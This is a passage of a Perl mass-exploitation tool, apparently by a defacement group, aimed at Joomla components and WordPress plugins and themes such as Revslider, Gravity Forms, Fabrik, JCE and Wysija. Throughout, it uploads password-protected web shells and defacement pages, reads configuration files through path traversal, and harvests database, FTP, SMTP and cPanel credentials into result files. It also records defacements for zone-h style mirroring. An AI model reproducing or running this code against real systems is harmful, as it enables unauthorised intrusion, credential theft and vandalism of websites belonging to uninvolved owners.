my $exploitx = $ua->post("$jdup", Cookie => "", Content_Type => "form-data", Content => [ name=>"BKSMILE", mail=>"zakarai0611420990@gmail.com", filetitle =>"Marocan wolf Team", catlist=>"1", license=>"0", language=>"0", system=>"0",file_upload=>["$filee"], pic_upload=>["$filezz"], description=>"<p>zot</p>", senden=>"Send file", option=>"com_jdownloads", view=>"upload", send=>"1", "0d6b031d7c5629129647e4018aba93d6"=>"1"]);
if ($exploit->decoded_content =~ /The file was successfully transferred to the server/) {
print " ...................>: ";            
print "OK";
print "\n";
print "SCANING INDEX ...................>:";           
print "WAIT";
print "\n";

my $response = $ua->get("$def")->status_line;
if ($response =~ /200/){
print "DEFACE ...................>:";           
print "(+) INDEX Uploaded";
print "\n";

print "INDEX LINK => $def","\n";
zoneh();
mirrorzon();
}else{
print "DEFACE ...................>:";            
print "ERROR";
print "\n";

        }
}
}else{ 
print  "...................>: ";            
print "[-]  [-]  NOT Vuln";
print "\n";

}

    }


############COM hdflvplayer##########################

   sub hdflvplayer($site){

# // here for download config but i have to add download cpanel information :p  //

        print "HDFLVPLAYER:";
$conflink = "$site/components/com_hdflvplayer/hdflvplayer/download.php?f=../../../configuration.php";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (10);
$resp = $ua->request(HTTP::Request->new(GET => $conflink));
$cont = $resp->content;
if($cont =~ m/class JConfig|mosConfig_offline_message/g){
    print "...................>: ",                
print "[+] Vuln";
print "\n";
    open(save, '>>Result/vulntargets.txt');   
    print save "hdflvplayer $site\n";   
    close(save);




        open (TEXT, '>>Result/databases.txt');
        print TEXT "$site\n DATABASE INFO\n";
        close (TEXT);
        print "\t DATABASE INFO\n";
        if ($cont =~ /user = \'(.*?)\';/){
        print "\t Database User = $1 \n";
        open (TEXT, '>>Result/databases.txt');
        print TEXT " Database User = $1 \n";
        close (TEXT);
  }
        if ($cont =~ /password = \'(.*?)\';/){
        print "\t Database Password = $1 \n";
        open (TEXT, '>>Result/databases.txt');
        print TEXT " Database Password = $1\n";
        close (TEXT);
  }
        if ($cont =~ /db = \'(.*?)\';/){
        print "\t Database Name = $1 \n";
        open (TEXT, '>>Result/databases.txt');
        print TEXT " Database Name = $1\n";
        close (TEXT);
  }
        if ($cont =~ /host = \'(.*?)\';/){
        print "\t Database Host = $1 \n";
        open (TEXT, '>>Result/databases.txt');
        print TEXT " Database Host = $1\n";
        close (TEXT);
  }


print "\t FTP INFO\n";
        if ($cont =~ /ftp_host = \'(.*?)\';/){
        print "\t FTP Host = $1 \n";
        open (TEXT, '>>Result/databases.txt');
        print TEXT "\n FTP INFO\n FTP Host = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_port = \'(.*?)\';/){
        print "\t FTP Port = $1 \n";
        open (TEXT, '>>Result/databases.txt');
        print TEXT "FTP Port = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_user = \'(.*?)\';/){
        print "\t FTP User = $1 \n";
        open (TEXT, '>>Result/databases.txt');
        print TEXT "FTP User = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_pass = \'(.*?)\';/){
        print "\t FTP Pass = $1 \n";
        open (TEXT, '>>Result/databases.txt');
        print TEXT "FTP Pass = $1\n\n";
        close (TEXT);
  }



print "\t SMTP INFO\n";
        if ($cont =~ /smtpuser = \'(.*?)\';/){
        print "\t SMTP User = $1 \n";
        open (TEXT, '>>Result/databases.txt');
        print TEXT " SMTP INFO\n SMTP User = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtppass = \'(.*?)\';/){
        print "\t SMTP Password = $1 \n";
        open (TEXT, '>>Result/databases.txt');
        print TEXT " SMTP Password = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtpport = \'(.*?)\';/){
        print "\t SMTP Port = $1 \n";
        open (TEXT, '>>Result/databases.txt');
        print TEXT "SMTP Port = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtphost = \'(.*?)\';/){
        print "\t SMTP Host = $1 \n\n";
        open (TEXT, '>>Result/databases.txt');
        print TEXT "SMTP Host = $1\n";
        close (TEXT);
  
}

}else{
print  "...................>: ";            
print "[-]  [-]  NOT Vuln";
print "\n";

    }

}
###############foxcontact##########################

sub foxcontactxbrang(){

my $url = "$site//components/com_foxcontact/";
my $shell ="_wolf.php";
my $field_name = "files[]";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);

$foxcontactxbrang="$site/components/com_foxcontact/_wolf.php";

if ($response->content =~ /{"files/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Formcraft";
print color('bold white')," ......................... ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [+]  [Dir] => $foxcontactxbrang\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$foxcontactxbrang\n";
close (TEXT);
}else{

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('Cyan'), "[foxcontact]\n";
print color('bold white'), "(-)Foxcontact Module Not Found \n"; 
print color('bold white')," ......................... ";
print color('bold red'),"[-]  NOT Vuln";
print color('bold white'),"\n";
print color('bold Green'), "[?]-outhr exploit by xbrang \n"; 
  
}
}
#####################Index gravity##################
sub Indexhtm{
print"[Index Htm] ...................... ";
my $path = "/?gf_page=upload";
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
my $indexploit = $ua->post("$site/$path", Cookie => "", Content_Type => "form-data", Content => [file => ["def.jpg"], field_id => "3", form_id => "1",gform_unique_id => "../../../../../", name => "lol.html"]);
if ($indexploit->decoded_content =~ /_input_3_lol.html/) {
    $def= $site . '/_input_3_lol.html';
	    print color('bold green');
    print "[+] UPLOADED]\n$def\n";
    print color('reset');

    open(save, '>>Result/index.txt');
    print save "[Gravity] : $def\n";
    close(save);
        zoneh();
       }else{
    print color('bold red');
print  "[[-]  NOT Vuln]\n";
    print color('reset');
       }
   }

##################COM FABRIC######################

sub comfabr(){
        print "COM FABRIC:";
$comfab= $site . '/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table=1';
$def = $site . '/media/xbrangg.php.txt';
$fabshell = $site . '/media/xbrangg.php.txt';
##
$indfile="xbrangg.php.txt";
$shelfile="xbrangg.php.txt";
##
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
my $indfab = $ua->post("$comfab", Cookie => "", Content_Type => "form-data", Content => ["userfile" => ["$shelfile"], "name" => "me.php", "drop_data" => "1", "overwrite" => "1", "field_delimiter" => ",", "text_delimiter" => "&quot;", "option" => "com_fabrik", "controller" => "import", "view" => "import", "task" => "doimport", "Itemid" => "0", "tableid" => "0"]);
my $checkfab = $ua->get("$fabshell")->content;
if($checkfab =~/wolf/) {
print "...................>: ";

print "[+] Vuln";
print "\n";
    open(save, '>>Result/vulntargets.txt');   
    print save "fabric $site\n";   
    close(save);

print "SHELL LINK => $fabshell\n";
        open (TEXT, '>>Result/shells.txt');
        print TEXT "COM FABRIC =>$fabshell \n";
        close (TEXT);
}else{
            print "...................>: ";            
print "[-]  [-]  NOT Vuln";
print "\n";

    }
}
############################################# INDEX ################################################

sub indecomfabr(){
    print "UPLOAD INDEX COM FABRIC ...................>:";
print "WAIT";
print "\n";
    my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
    $ua->timeout(10);
    $ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
    my $indfab = $ua->post("$comfab", Cookie => "", Content_Type => "form-data", Content => ["userfile" => ["$indfile"], "name" => "me.php", "drop_data" => "1", "overwrite" => "1", "field_delimiter" => ",", "text_delimiter" => "&quot;", "option" => "com_fabrik", "controller" => "import", "view" => "import", "task" => "doimport", "Itemid" => "0", "tableid" => "0"]);
my $checkfab = $ua->get("$def")->content;
if($checkfab =~/Hacked/) {
        open(save, '>>Result/vulntargets.txt');   
    print save "fabric $site\n";   
    close(save);

    print "DEFACE ...................>: ";
print "(+)Index Uploaded";
print "\n";

    print "INDEX LINK => $def\n";
zoneh();
mirrorzon();
            }else{
print  "DEFACE ...................>: ";        
print "ERROR";
print "\n";

                        }
}

##########COM USERS #############

sub comusers(){
    print "COM USER SCANNER:";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (20);

my $exploit = "$site/index.php?option=com_users&view=registration";
my $checkk = $ua->get("$exploit")->content;
if($checkk =~/jform_email2-lbl/) {
    print"...................>: ";           
print "[+] Vuln";
print "\n";
    open(save, '>>Result/vulntargets.txt');   
    print save "users $site\n";   
    close(save);

    }else{
        print"...................>: ";        
print "[-]  [-]  NOT Vuln";
print "\n";
    }
}

##############################COM ADS ANAGER#####################

sub comadsmanegr(){
    print color("Red"), "COM ADS MANAGER:\n";
my $path = "/index.php?option=com_adsmanager&task=upload&tmpl=component";
if($site !~ /http:\/\//) { $target = "http://$site/"; };
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
my $exploit = $ua->post("$site/$path", Cookie => "", Content_Type => "form-data", Content => [file => ["def.jpg"], name => "xbrang.html"]);
if ($exploit->decoded_content =~ /xbrang.html/) {
    print "...................>: VULN \n";
        open(save, '>>Result/vulntargets.txt');   
    print save "adsmanager $site\n";   
    close(save);

    print "UPLOAD INDEX ...................>: ";
print "OK";
print "\n";

    $def="$site/tmp/plupload/xbrang.html";
my $checkdef = $ua->get("$def")->content;
if($checkdef =~/Hacked|Defaced|xbrang|wolf/) {
    print "DEFACE ...................>: ";
print "SUCCESS";
print "\n";
print "INDEX LINK => $def\n";
    zoneh();
    mirrorzon();
    adshell();
    }
}else
{print "...................>: ";
print "[-]  [-]  NOT Vuln";
print "\n";
}
}




sub adshell(){

        print "UPLOAD SHELL ...................>: ";
my $path = "/index.php?option=com_adsmanager&task=upload&tmpl=component";
my $exploitxx = $ua->post("$site/$path", Cookie => "", Content_Type => "form-data", Content => [file => ["loader.jpg"], name => "xbrang.php"]);
if ($exploitxx->decoded_content =~ /xbrang.php/) {
print "OK";
print "\n";
print "SCANING SHELL ...................>: ";
print "WAIT";
print "\n";

my $check = $ua->get("$site/tmp/plupload/xbrang.php")->content;
my $checkk = $ua->get("$site/xbrang.php")->content;
if($checkk =~/<form method=post>Password: <input type=password name=pass><input type=submit value=/) {
print "SHELL ...................>:";           
print "SUCCESS";
print "\n";
print "SHELL LINK => $site/xbrang.php\n";
    open(save, '>>Result/shells.txt');
    print save "adsmanager $site/xbrang.php\n";
    close(save);
    my $checkjo = $ua->get("$site/un.php")->content;
if($checkjo =~ /path:(.*)<b><br>uname:(.*)<br><\/b>wolf/){
    print "\n";
print "PATH : $1","\n\n";
print "KERNEL:$2","\n";
print "\n";
    open(save, '>>Result/shells.txt');
    
    print save "Path : $1\nKernel:$2\n";
    
    close(save);
}
}else{
  print "SHELL ...................>:";            
print "ERROR";
print "\n";
}

}
}

######################
###### Jce Img ########################################
######################




  sub comjcea(){
$ua = LWP::UserAgent->new();
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout(15);


$exploiturl="/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20";

$vulnurl=$site.$exploiturl;
$res = $ua->get($vulnurl)->content;
print"[Index gif Upload] ................... ";


if ($res =~ m/No function call specified!/i){
my $res = $ua->post($vulnurl,
    Content_Type => 'form-data',
    Content => [
        'upload-dir' => './../../',
        'upload-overwrite' => 0,
        'Filedata' => ["xbrang_wolf.gif"],
        'action' => 'upload'
        ]
    )->decoded_content;
if ($res =~ m/"error":false/i){

}else{
    print color('bold red');
print "[[-]  NOT Vuln]\n ";
    print color('reset');


}

$remote = IO::Socket::INET->new(
        Proto=>'tcp',
        PeerAddr=>"$site",
        PeerPort=>80,
        Timeout=>15
        );
$def= "$site/xbrang_wolf.gif";
$check = $ua->get($def)->status_line;
if ($check =~ /200/){
    open(save, '>>Result/index.txt');
    print save "[Defaced JCE] $def\n";
    close(save);
    print color('bold green');
	print "[UPLODED]\n";
    print color('reset');
zoneh();



}

}
else{
    print color('bold red');
print  "[[-]  NOT Vuln]\n";
    print color('reset');

}
    }

	
## #################Revslider Shell ############################################################

sub revsheldl(){
print"[Auto Revslider Shell] ======>>>> ";

my $path = "wp-admin/admin-ajax.php";


my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
my $exploit = $ua->post("$site/$path", Cookie => "", Content_Type => "form-data", Content => [action => "revslider_ajax_action", client_action => "update_plugin", update_file => ["revslider.zip"]]);

if ($exploit->decoded_content =~ /Wrong update extracted folder/) {
    print color('bold green');
print "[Success]\n";
    print color('reset');

my $check = $ua->get("$site/wp-content/plugins/revslider/temp/update_extract/revslider/xman.php")->content;
if($check =~/Xbrang wolf/) {

	    print color('bold yellow');
print "[Uploading Shell] .................... ";
    print color('reset');
	    print color('bold green');
print "[Success]\n";
    print color('reset');

    open(save, '>>BOTrslt/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/plugins/revslider/temp/update_extract/revslider/xman.php\n";
    close(save); 
	$def = "$site/def.html";
	zoneh();
    } else {  }
my $avada = $ua->get("$site/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/xman.php")->content;
if($avada =~/Xbrang wolf/) {

	    print color('bold yellow');
print "[Uploading Shell] .................... ";
    print color('reset');
	    print color('bold green');
print "[Success]\n";
    print color('reset');    open(save, '>>BOTrslt/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/xman.php\n";
    close(save); 
    	$def = "$site/def.html";
	zoneh();

}
else {  }
my $striking_r = $ua->get("$site/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/xman.php")->content;
if($striking_r =~/Xbrang wolf/) {

	    print color('bold yellow');
print "[Uploading Shell] .................... ";
    print color('reset');
	    print color('bold green');
print "[Success]\n";
    print color('reset');    open(save, '>>BOTrslt/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/xman.php\n";
    close(save); 
		$def = "$site/def.html";
	zoneh();

}
else {  }
my $IncredibleWP = $ua->get("$site/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/xman.php")->content;
if($IncredibleWP =~/Xbrang wolf/) {

	    print color('bold yellow');
print "[Uploading Shell] .................... ";
    print color('reset');
	    print color('bold green');
print "[Success]\n";
    print color('reset');    open(save, '>>BOTrslt/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/xman.php\n";
    close(save); 
		$def = "$site/def.html";
	zoneh();

}
else {  }
my $ultimatum = $ua->get("$site/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/xman.php")->content;
if($ultimatum =~/Xbrang wolf/) {

	    print color('bold yellow');
print "[Uploading Shell] .................... ";
    print color('reset');
	    print color('bold green');
print "[Success]\n";
    print color('reset');    open(save, '>>BOTrslt/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/xman.php\n";
    close(save); 
		$def = "$site/def.html";
	zoneh();

}
else {  }
my $medicate = $ua->get("$site/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/xman.php")->content;
if($medicate =~/Xbrang wolf/) {

	    print color('bold yellow');
print "[Uploading Shell] .................... ";
    print color('reset');
	    print color('bold green');
print "[Success]\n";
    print color('reset');    open(save, '>>BOTrslt/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/xman.php\n";
    close(save); 
		$def = "$site/def.html";
	zoneh();

}
else {  }
my $centum = $ua->get("$site/wp-content/themes/centum/revslider/temp/update_extract/revslider/xman.php")->content;
if($centum =~/Xbrang wolf/) {

	    print color('bold yellow');
print "[Uploading Shell] .................... ";
    print color('reset');
	    print color('bold green');
print "[Success]\n";
    print color('reset');    open(save, '>>BOTrslt/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/themes/centum/revslider/temp/update_extract/revslider/xman.php\n";
    close(save); 
		$def = "$site/def.html";
	zoneh();

}
else {  }
my $beach_apollo = $ua->get("$site/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/xman.php")->content;
if($beach_apollo =~/Xbrang wolf/) {

	    print color('bold yellow');
print "[Uploading Shell] .................... ";
    print color('reset');
	    print color('bold green');
print "[Success]\n";
    print color('reset');    open(save, '>>BOTrslt/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/xman.php\n";
    close(save); 
		$def = "$site/def.html";
	zoneh();

}
else { }
my $cuckootap = $ua->get("$site/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/xman.php")->content;
if($cuckootap =~/Xbrang wolf/) {

	    print color('bold yellow');
print "[Uploading Shell] .................... ";
    print color('reset');
	    print color('bold green');
print "[Success]\n";
    print color('reset');    open(save, '>>BOTrslt/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/xman.php\n";
    close(save); 
		$def = "$site/def.html";
	zoneh();

}
else {  }
my $pindol = $ua->get("$site/wp-content/themes/pindol/revslider/temp/update_extract/revslider/xman.php")->content;
if($pindol =~/Xbrang wolf/) {

    print "[+] pindol successfully uploaded\n";
    open(save, '>>BOTrslt/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/themes/pindol/revslider/temp/update_extract/revslider/xman.php\n";
    close(save); 
		$def = "$site/def.html";
	zoneh();

}
else {  }
my $designplus = $ua->get("$site/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/xman.php")->content;
if($designplus =~/Xbrang wolf/) {

	    print color('bold yellow');
print "[Uploading Shell] .................... ";
    print color('reset');
	    print color('bold green');
print "[Success]\n";
    print color('reset');    open(save, '>>BOTrslt/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/xman.php\n";
    close(save); 
		$def = "$site/def.html";
	zoneh();

}
else {  }
my $rarebird = $ua->get("$site/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/xman.php")->content;
if($rarebird =~/Xbrang wolf/) {

	    print color('bold yellow');
print "[Uploading Shell] .................... ";
    print color('reset');
	    print color('bold green');
print "[Success]\n";
    print color('reset');
    open(save, '>>BOTrslt/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/xman.php\n";
    close(save); 
		$def = "$site/def.html";
	zoneh();

}
else {  }
my $andre = $ua->get("$site/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/xman.php")->content;
if($andre =~/Xbrang wolf/) {

	    print color('bold yellow');
print "[Uploading Shell] .................... ";
    print color('reset');
	    print color('bold green');
print "[Success]\n";
    print color('reset');    open(save, '>>BOTrslt/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/xman.php\n";
    close(save); 
		$def = "$site/def.html";
	zoneh();

}
else { }
} else {
    print color('bold red');
print  "[[-]  NOT Vuln]\n";
    print color('reset');
}
}
###############COM BLOG SCANNER########################

sub comblog(){
    print "COM BLOG SCANNER:";


$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (10);

my $exploitblog = "$site/index.php?option=com_myblog&task=ajaxupload";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~/has been uploaded/) {
    print"...................>: ";
print "[+] Vuln";
print "\n";
    open(save, '>>Result/vulntargets.txt');   
    print save "blog $site\n";   
    close(save);

print " $site EXPLOIT IT MANUEL \n";
    }
    else {print "...................>: ";
print "[-]  [-]  NOT Vuln";
print "\n";

}
}

##################################################

sub dlskin(){
print "DL-SKIN_";
@dlk=('/wp-content/themes/infocus/lib/scripts/dl-skin.php', '/wp-content/themes/elegance/lib/scripts/dl-skin.php', '/wp-content/themes/awake/lib/scripts/dl-skin.php', '/wp-content/themes/fusion/lib/scripts/dl-skin.php', '/wp-content/themes/Minamaze_Pro/lib/scripts/dl-skin.php', '/wp-content/themes/construct/lib/scripts/dl-skin.php', '/wp-content/themes/persuasion/lib/scripts/dl-skin.php', '/wp-content/themes/dejavu/lib/scripts/dl-skin.php', '/wp-content/themes/versatile/lib/scripts/dl-skin.php', '/wp-content/themes/Melos_Pro/lib/scripts/dl-skin.php', '/wp-content/themes/barracudafx/lib/scripts/dl-skin.php', '/wp-content/themes/mesocolumn/lib/scripts/dl-skin.php');
if($site !~ /http:\/\//) { $site = "http://$site/"; };
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
foreach $dlkk(@dlk){
chomp $dlkk;
$url = $site.$dlkk;
#_mysite_download_skin => '../../../../../wp-config.php
my $exploitdl = $ua->post("$url",Content-Length => '1', Content =>  ['_mysite_download_skin', => '../../../../../wp-config.php'] );
$dlz = $exploitdl->content;
if($dlz =~ m/DB_NAME/g){
print "...................>: ";
print "[+] Vuln";
print "\n";
    open(save, '>>Result/vulntargets.txt');   
    print save "dl-skin cnfg $site\n";   
    close(save);
my $exploitdl2 = $ua->post("$url",Content-Length => '1', Content =>  ['_mysite_download_skin', => '../../../../../wp-config.php'] );
$dlzz = $exploitdl2->content;
while($dlzz =~ m/DB_NAME/g){


        if ($dlzz =~ /DB_NAME\', \'(.*)\'\)/){
        print "\t Database Name = $1 \n";
        open (TEXT, '>>Result/databases.txt');
        print TEXT "\n DATABASE  \n$site\n[-]Database Name = $1";
        close (TEXT);
        }
        if ($dlzz =~ /DB_USER\', \'(.*)\'\)/){
        print "\t Database User = $1 \n";
        open (TEXT, '>>Result/databases.txt');
        print TEXT "\n Database User = $1";
        close (TEXT)
        }
        if ($dlzz =~ /DB_PASSWORD\', \'(.*)\'\)/){
        print "\t Database Password = $1 \n";
        $pass= $1 ;
        open (TEXT, '>>Result/databases.txt');
        print TEXT "\n Database Password = $pass";
        close (TEXT)
        }
        if ($dlzz =~ /DB_HOST\', \'(.*)\'\)/){
        print "\t Database Host = $1 \n\n";
        open (TEXT, '>>Result/databases.txt');
        print TEXT "\n Database Host = $1";
        close (TEXT)
        }

wpbrutek();

print "DL-SKIN GET CPANEL";
my $exploitdl23 = $ua->post("$url",Content-Length => '1', Content =>  ['_mysite_download_skin', => '../../../../../wp-config.php'] );
$dlzzz = $exploitdl23->content;
if($dlzzz =~ m/user=/g){
print "...................>: ";
print "FOUNDED";
print "\n";
    open(save, '>>Result/vulntargets.txt');   
    print save "dl-skin cpnl $site\n";   
    close(save);
my $exploitdl234 = $ua->post("$url",Content-Length => '1', Content =>  ['_mysite_download_skin', => '../../../../../../.my.cnf'] );
$dlzzzz = $exploitdl234->content;
while($dlzzzz =~ m/user/g){
        if ($dlzzzz =~ /user=(.*)/){

        print "\n\t Cpanel User = $1 \n";
        open (TEXT, '>>Result/cpanels.txt');
        print TEXT "\n cpanel  \n$site\n[-]cpanel user = $1";
        close (TEXT);
        }
        if ($dlzzzz =~ /password="(.*)"/){
        print "\t Cpanel Pass = $1 \n\n";
        open (TEXT, '>>Result/cpanels.txt');
        print TEXT "\n Cpanel Pass = $1";
        close (TEXT)
        }


}
}else{print "...................>: ";
print "NOT FOUNDED";
print "\n";
}
}}
}
}
####################################################################################################

sub wysija(){
print "WYSIJA:";

$zokometheme = "my-theme";
my $path = "/wp-admin/admin-post.php?page=wysija_campaigns&action=themes";
if($site !~ /http:\/\//) { $site = "http://$site/"; };
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");


my $exploit = $ua->post("$site/$path", Content_Type => 'form-data', Content => [ $zokometheme => ['wolf3.zip', => 'wolf.zip'], overwriteexistingtheme => "on",action => "themeupload", submitter => "Upload",]);

my $check = $ua->get("$site/wp-content/uploads/wysija/themes/wolf/herewgo.php")->content;
my $check = $ua->get("$site//wp-content/plugins/revslider/temp/update_extract/revslider/xbrang.php")->content;
my $checkk = $ua->get("$site/xbrang.php")->content;
if($checkk =~/<form method=post>Password: <input type=password name=pass><input type=submit value=/) {
        open(save, '>>Result/vulntargets.txt');   
    print save "wysija $site\n";   
    close(save);
print"...................>: ";
print "OK";
print "\n";

print "UPLOADING SHELL...................>: ";
print color('bold white'),"  [Link] => $site\n";


print "SUCCESS";
print "\n";
print "SHELL LINK => $site/xbrang.php\n";
    open(save, '>>Result/shells.txt');  
    print save "WYSIJA $site/xbrang.php\n"; 
    close(save);
my $checkgasss = $ua->get("$site/wolf3.php")->content;
if($checkgasss =~ /path:(.*)<b><br>uname:(.*)<br><\/b>wolf xbrang/){
    print "\n";
print  "PATH : $1","\n\n";
print  "KERNEL:$2","\n";
print "\n";
    open(save, '>>Result/shells.txt');
    
    print save "Path : $1\nKernel:$2\n";
    
    close(save);
}
$def="$site/xbrang.html";
my $fuckingcheck = $ua->get("$def")->content;
    if($fuckingcheck =~m/X~brang Team wolf|Hacked/i) {
                    zoneh();
                    mirrorzon();
}




}else {
    print"...................>: ";

print "ERROR";
print "\n";

}
}
#############GRAVITY FORMS################################

sub gravity(){
print "GRAVITY FORMS:";
my $path = "/?gf_page=upload";
if($site !~ /http:\/\//) { $site = "http://$site/"; };
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
my $exploitgrav = $ua->post("$site/$path", Cookie => "", Content_Type => "form-data", Content => [file => ["wolf.jpg"], field_id => "3", form_id => "1",gform_unique_id => "../../../../../", name => "wolf.php5"]);
if ($exploitgrav->decoded_content =~ /_input_3_xbrang.php5/) {
    print "...................>: ";
print "[+] Vuln";
print "\n";
    open(save, '>>Result/vulntargets.txt');   
    print save "gravi $site\n";   
    close(save);

    print "SCANING SHELL ...................>: ";
    open(save, '>>Result/libs.txt');
        print save "$site/_input_3_xbrang.php5\n";
        close(save);
    my $checkgrav = $ua->get("$site/_input_3_xbrang.php5")->content;
    my $checkkgrav = $ua->get("$site/xbrang.php")->content;
        if($checkkgrav =~/<form method=post>Password: <input type=password name=pass><input type=submit value=/) {
print "UPLODED";
print "\n";
print "SHELL LINK => $site/xbrang.php \n";
        open(save, '>>Result/shells.txt');  
        print save "GRAVITY  $site/xbrang.php\n";   
        close(save);

# get uname and path on server 
my $checkgasss = $ua->get("$site/wolf3.php")->content;
            if($checkgasss =~ /path:(.*)<b><br>uname:(.*)<br><\/b> Marocan wolf team /){
    print "\n";
print "PATH : $1","\n\n";
print "KERNEL :$2","\n";
print "\n";
            open(save, '>>Result/shells.txt'); 
            print save "Path : $1\nKernel:$2\n";    
            close(save);
            $def="$site/xbrang.html";
            zoneh();
            mirrorzon();
}
#### get info Done ..//// 



    }else{
            
print "ERROR!!";
print "\n";
upindex();



}





}else{  print "...................>: ";
print "[-]  [-]  NOT Vuln";
print "\n";
}
}

sub upindex{
my $path = "/?gf_page=upload";
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
my $indexploit = $ua->post("$site/$path", Cookie => "", Content_Type => "form-data", Content => [file => ["def.jpg"], field_id => "3", form_id => "1",gform_unique_id => "../../../../../", name => "xbrang.html"]);
print "DEFACE ...................>:";
if ($indexploit->decoded_content =~ /_input_3_xbrang.html/) {
    $def= $site . '_input_3_xbrang.html';
print "SUCCESS";
print"\n";
        print "INDEX LINK => $def ","\n";
        zoneh();
        mirrorzon();
       }else{
        print "...................>: ERROR\n";
       }
   }

#####################################    REVSLIDER    ########################################

sub getconfig{
print "REVSLIDER GETCONFIG:";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (10);
$config = "wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php";
$conflink = "$site/$config";
